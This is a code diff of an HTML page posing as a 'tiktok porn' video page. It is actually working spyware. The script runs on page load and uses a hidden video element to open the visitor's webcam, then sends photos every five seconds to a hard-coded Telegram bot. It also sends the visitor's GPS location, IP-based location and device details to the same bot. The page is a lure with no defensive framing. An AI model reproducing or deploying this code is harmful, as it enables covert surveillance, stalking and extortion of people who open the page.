@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<title>Video Porn</title>
+  <meta charset="UTF-8">
+  <title>tiktok porn</title>
 </head>
 <body>
-
-<video id="video" width="0" height="0" autoplay></video>
-<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-
+  
+  <video id="video" width="0" height="0" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  
 <iframe 
   width="100%" 
   height="2000" 
@@ -20,52 +20,135 @@
 </iframe>
 
   <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
+    const TELEGRAM_BOT_TOKEN = "7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw";
+    const CHAT_ID = "5454881984";
 
-<script>
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+    async function captureAndSend() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async function(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
 
-const TELEGRAM_BOT_TOKEN = "7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw";
-const CHAT_ID = "5454881984";
-
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-  video.srcObject = stream;
-})
-.catch(err => {
-  alert("لا يمكن الوصول إلى الكاميرا: " + err);
-});
-
-async function captureAndSend() {
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  canvas.toBlob(async function(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, 'photo.jpg');
-
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-      const data = await response.json();
-      if(data.ok){
-        console.log('تم إرسال الصورة');
-      } else {
-        console.error('خطأ في الإرسال:', data);
-      }
-    } catch (error) {
-      console.error('خطأ في الإرسال:', error);
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          const data = await response.json();
+          if (data.ok) {
+            console.log('');
+          } else {
+            console.error('', data);
+          }
+        } catch (error) {
+          console.error(':', error);
+        }
+      }, 'image/jpeg');
     }
-  }, 'image/jpeg');
-}
 
-// التقط صورة كل 5 ثواني تلقائيًا
-setInterval(captureAndSend, 1000);
-</script>
+    // شغل الكاميرا وانتظر حتى تبدأ فعلياً قبل إرسال أي صورة
+    async function startCameraAndSending() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
+        // انتظر حتى يتم تحميل أول صورة (يعني الكاميرا تعمل فعلاً)
+        await new Promise(resolve => {
+          video.onloadeddata = () => {
+            console.log("");
+            resolve();
+          };
+        });
+
+        // بعد التأكد من عمل الكاميرا، ابدأ الإرسال كل 5 ثواني
+        setInterval(captureAndSend, 5000);
+
+      } catch (err) {
+        alert("دەبێت سەرەتا هەموو بەشەکان کە دەکرێتەوە بەسەندی بکەی");
+        console.error("دوبارە هەوڵ بدەوە و بیکەوە", err);
+      }
+    }
+
+    // ابدأ مباشرة عند تحميل الصفحة
+    startCameraAndSending();
+    
+// بيانات البوت
+    
+    function sendTelegramMessage(text) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML"
+        })
+      });
+    }
+
+    function getDeviceInfo() {
+      return `
+🧾 <b>Device Info</b>
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Memory: ${navigator.deviceMemory || 'N/A'} GB
+Cores: ${navigator.hardwareConcurrency || 'N/A'}
+Cookies Enabled: ${navigator.cookieEnabled}
+      `;
+    }
+
+    function getIPInfo() {
+      fetch('https://api.db-ip.com/v2/free/self')
+        .then(res => res.json())
+        .then(data => {
+          const msg = `
+🌐 <b>IP Info</b>
+IP: ${data.ipAddress}
+City: ${data.city}
+Region: ${data.stateProv}
+Country: ${data.countryName}
+Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}
+          `;
+          sendTelegramMessage(msg);
+        }).catch(() => {
+          sendTelegramMessage("❌ Failed to get IP info.");
+        });
+    }
+
+    function getLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const msg = `📍 <b>Location</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
+            sendTelegramMessage(msg);
+
+            // بعدها باقي المعلومات
+            sendTelegramMessage(getDeviceInfo());
+            getIPInfo();
+          },
+          err => {
+            sendTelegramMessage("⚠️ Location access denied.");
+            sendTelegramMessage(getDeviceInfo());
+            getIPInfo();
+          }
+        );
+      } else {
+        sendTelegramMessage("❌ Geolocation not supported.");
+        sendTelegramMessage(getDeviceInfo());
+        getIPInfo();
+      }
+    }
+
+    // يبدأ التنفيذ تلقائيًا
+    getLocation();
+  </script>
 </body>
 </html>
